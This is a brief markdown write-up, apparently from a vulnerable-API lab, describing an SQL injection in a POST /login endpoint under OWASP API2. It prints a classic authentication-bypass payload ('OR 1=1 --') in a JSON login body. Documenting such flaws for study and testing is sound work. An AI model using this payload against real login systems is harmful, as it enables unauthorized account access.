# API2 – Broken Authentication (SQL Injection)

## 📌 Vulnerability Type
OWASP API2: Broken Authentication

## 🎯 Description
Login endpoint vulnerable to SQL injection due to unsafe query construction.

## 🔍 Vulnerable Endpoint
POST /login

## 🧪 Payload

```json
{
  "username": "' OR 1=1 --",
  "password": "anything"
}
